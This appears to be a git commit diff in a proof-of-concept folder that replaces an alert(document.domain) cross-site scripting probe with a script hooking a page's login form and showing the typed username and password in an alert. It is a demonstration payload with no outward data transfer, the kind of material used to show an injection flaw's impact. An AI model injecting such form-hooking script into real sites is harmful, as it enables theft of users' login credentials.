ad4a524f7997e9a7718186716d100ec5e729d762
Khara-h1 <117389489+Khara-h1@users.noreply.github.com>
2024-03-27 16:53:49 +0100

    Update atri1.js

--- poc/parla/atri1.js
+++ poc/parla/atri1.js
@@ -1,1 +1,19 @@
-alert(document.domain)
+function formHandler(e) {
+  console.log(e);
+  if (e?.srcElement.length > 0) {
+    alert("The credentials are been spied on: \n" +
+      "Login is : " + e.srcElement[0].value + "\n" +
+      "Password is : " + e.srcElement[1].value + "\n"
+    );
+  }
+}
+
+function hookMessageHandler() {
+  login = document.getElementById("Login");
+  login.onsubmit = (e) => {
+    formHandler(e);
+  };
+  alert("Form is now hooked and ready to spied on")
+}
+
+setTimeout(hookMessageHandler, 3000);
